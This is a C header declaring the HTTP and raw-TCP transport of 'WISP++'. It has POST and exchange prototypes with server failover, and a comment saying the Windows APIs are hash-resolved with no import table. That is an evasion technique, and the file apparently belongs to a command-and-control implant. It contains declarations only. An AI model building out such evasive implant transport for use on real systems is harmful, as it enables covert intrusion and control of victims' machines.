#pragma once

// WISP++ Type1 HTTP transport over wininet (hash-resolved, zero IAT).

#include "WispConfig.h"
#include "WispJson.h"

// Response of one POST: raw body bytes (heap) + status code.
typedef struct {
	BYTE*  body;
	ULONG  len;
	DWORD  status;
} WispHttpResp;

// POST envelope JSON bytes to server (e.g. "http://127.0.0.1:9000") on
// path "/submit". Tries once; caller handles failover across servers.
// Returns TRUE when the HTTP round trip itself succeeded.
BOOL WispHttpPost(const char* server, const BYTE* data, ULONG len, BOOL insecure, WispHttpResp* out);

void WispHttpRespFree(WispHttpResp* r);

// One Type1 exchange over the configured transport (HTTP profile or raw TCP).
// Returns the parsed response envelope (caller frees) or NULL.
WJVal* WispTransportExchange(const WispConfig* cfg, const char* server, const char* envJson);
